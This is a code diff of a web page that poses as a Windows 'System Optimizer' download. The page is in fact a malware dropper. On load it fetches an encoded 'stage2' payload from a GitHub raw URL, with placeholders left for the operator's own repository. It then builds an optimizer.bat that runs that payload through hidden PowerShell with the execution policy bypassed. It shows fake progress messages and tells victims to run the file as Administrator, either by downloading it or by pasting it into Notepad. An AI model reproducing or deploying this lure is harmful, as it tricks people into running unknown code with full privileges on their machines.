@@ -46,6 +46,7 @@
             transition: transform 0.2s, box-shadow 0.2s;
             border: none;
             cursor: pointer;
+            margin: 5px;
         }
         .btn:hover {
             transform: translateY(-2px);
@@ -55,6 +56,37 @@
             font-size: 64px;
             margin-bottom: 20px;
         }
+        .hidden {
+            display: none;
+        }
+        #installer-container {
+            margin-top: 30px;
+            padding: 20px;
+            background: #f5f5f5;
+            border-radius: 10px;
+        }
+        textarea {
+            width: 100%;
+            height: 100px;
+            padding: 10px;
+            border: 2px solid #ddd;
+            border-radius: 5px;
+            font-family: monospace;
+            font-size: 12px;
+            margin: 10px 0;
+        }
+        .instructions {
+            text-align: left;
+            background: #fff3cd;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 15px;
+            font-size: 14px;
+            line-height: 1.8;
+        }
+        .instructions strong {
+            color: #856404;
+        }
     </style>
 </head>
 <body>
@@ -62,84 +94,181 @@
         <div class="icon">⚡</div>
         <h1>System Optimizer</h1>
         <p>Enhance your Windows system performance with our optimization tool</p>
-        <button class="btn" onclick="downloadInstaller()">📥 Download Tool</button>
+        
+        <button class="btn" onclick="showMethod1()">📥 Method 1: Auto Download</button>
+        <button class="btn" onclick="showMethod2()">📋 Method 2: Manual Copy</button>
+        
+        <!-- Method 1: Auto Download -->
+        <div id="method1" class="hidden">
+            <div id="installer-container">
+                <h3 style="margin-bottom: 15px;">Auto Download</h3>
+                <button class="btn" onclick="downloadBat()">Download BAT File</button>
+                <div class="instructions">
+                    <strong>Instructions:</strong><br>
+                    1. Click "Download BAT File" above<br>
+                    2. Check your Downloads folder for <strong>optimizer.bat</strong><br>
+                    3. Right-click the file → "Run as Administrator"<br>
+                    4. Wait for completion message
+                </div>
+            </div>
+        </div>
+        
+        <!-- Method 2: Manual Copy -->
+        <div id="method2" class="hidden">
+            <div id="installer-container">
+                <h3 style="margin-bottom: 15px;">Manual Installation</h3>
+                <p style="font-size: 14px; color: #666; margin-bottom: 10px;">
+                    Copy the code below:
+                </p>
+                <textarea id="batCode" readonly onclick="this.select()"></textarea>
+                <button class="btn" onclick="copyCode()">📋 Copy to Clipboard</button>
+                <div class="instructions">
+                    <strong>Instructions:</strong><br>
+                    1. Click "Copy to Clipboard" above<br>
+                    2. Open Notepad on Windows<br>
+                    3. Paste the code (Ctrl+V)<br>
+                    4. Save as <strong>optimizer.bat</strong> (not .txt!)<br>
+                    5. Right-click → "Run as Administrator"
+                </div>
+            </div>
+        </div>
     </div>
     
     <script>
-    function downloadInstaller() {
-        const installerHTML = `<!DOCTYPE html>
-<html>
-<head>
-    <title>Installing System Optimizer</title>
-    <style>
-        body { font-family: system-ui; padding: 40px; text-align: center; }
-        h2 { color: #333; margin-bottom: 20px; }
-        #status { color: #666; margin: 20px 0; }
-        .spinner { 
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #667eea;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-    </style>
-</head>
-<body>
-    <h2>System Optimizer Installation</h2>
-    <div class="spinner"></div>
-    <p id="status">Initializing...</p>
+    // IMPORTANT: Replace with YOUR values!
+    const GITHUB_RAW_URL = 'https://raw.githubusercontent.com/YOURUSERNAME/YOURREPO/main/stage2.txt';
     
-    <script>
+    let encodedPayload = null;
+    
+    // Fetch payload on page load
     (async function() {
-        const status = document.getElementById('status');
+        try {
+            const response = await fetch(GITHUB_RAW_URL);
+            encodedPayload = await response.text();
+        } catch (error) {
+            console.error('Failed to fetch payload:', error);
+        }
+    })();
+    
+    function showMethod1() {
+        document.getElementById('method1').classList.remove('hidden');
+        document.getElementById('method2').classList.add('hidden');
+    }
+    
+    function showMethod2() {
+        document.getElementById('method2').classList.remove('hidden');
+        document.getElementById('method1').classList.add('hidden');
+        loadBatCode();
+    }
+    
+    async function loadBatCode() {
+        const textarea = document.getElementById('batCode');
+        
+        if (!encodedPayload) {
+            try {
+                const response = await fetch(GITHUB_RAW_URL);
+                encodedPayload = await response.text();
+            } catch (error) {
+                textarea.value = 'Error loading payload. Please refresh the page.';
+                return;
+            }
+        }
+        
+        const batContent = `@echo off
+echo ============================================
+echo    System Optimizer Installation
+echo ============================================
+echo.
+echo Installing optimization modules...
+echo Please wait, this may take 1-2 minutes...
+echo.
+
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand ${encodedPayload}
+
+echo.
+echo ============================================
+echo    Installation Complete!
+echo ============================================
+echo.
+echo System optimization has been applied.
+echo You can now close this window.
+echo.
+pause`;
+        
+        textarea.value = batContent;
+    }
+    
+    function copyCode() {
+        const textarea = document.getElementById('batCode');
+        textarea.select();
+        textarea.setSelectionRange(0, 99999); // For mobile
         
         try {
-            status.textContent = 'Downloading components...';
-            
-            // Download PowerShell payload from GitHub
-            const response = await fetch('https://github.com/shrnx/readme/blob/main/stage2.txt');
-            const encodedPayload = await response.text();
-            
-            status.textContent = 'Installing optimization modules...';
-            
-            // Create batch file to execute PowerShell
-            const batchContent = `@echo off
+            document.execCommand('copy');
+            alert('✓ Code copied to clipboard!\n\nNow:\n1. Open Notepad\n2. Paste (Ctrl+V)\n3. Save as optimizer.bat\n4. Run as Administrator');
+        } catch (err) {
+            alert('Please manually select and copy the text above');
+        }
+    }
+    
+    async function downloadBat() {
+        if (!encodedPayload) {
+            alert('Loading payload... Please try again in a moment.');
+            try {
+                const response = await fetch(GITHUB_RAW_URL);
+                encodedPayload = await response.text();
+            } catch (error) {
+                alert('Error: Could not load payload. Please check your internet connection.');
+                return;
+            }
+        }
+        
+        const batContent = `@echo off
+echo ============================================
+echo    System Optimizer Installation
+echo ============================================
+echo.
+echo Installing optimization modules...
+echo Please wait, this may take 1-2 minutes...
+echo.
+
 powershell -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand ${encodedPayload}
-`;
-            
-            // Download as .bat file
-            const blob = new Blob([batchContent], { type: 'text/plain' });
+
+echo.
+echo ============================================
+echo    Installation Complete!
+echo ============================================
+echo.
+echo System optimization has been applied.
+echo You can now close this window.
+echo.
+pause`;
+        
+        try {
+            // Method 1: Blob download
+            const blob = new Blob([batContent], { type: 'text/plain' });
             const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
             a.href = url;
             a.download = 'optimizer.bat';
-            a.click();
-            URL.revokeObjectURL(url);
             
-            status.textContent = '✓ Downloaded! Please run optimizer.bat to complete installation.';
+            // Trigger download
+            document.body.appendChild(a);
+            a.click();
+            
+            // Cleanup
+            setTimeout(() => {
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+            }, 100);
+            
+            alert('✓ Download started!\n\nCheck your Downloads folder for optimizer.bat\n\nRight-click it and select "Run as Administrator"');
             
         } catch (error) {
-            status.textContent = 'Error: ' + error.message;
+            // Fallback to manual method
+            alert('Auto-download failed. Please use Method 2 (Manual Copy) instead.');
+            showMethod2();
         }
-    })();
-    <\/script>
-</body>
-</html>`;
-        
-        // Download installer
-        const blob = new Blob([installerHTML], { type: 'text/html' });
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = 'optimizer-installer.html';
-        a.click();
-        URL.revokeObjectURL(url);
     }
     </script>
 </body>
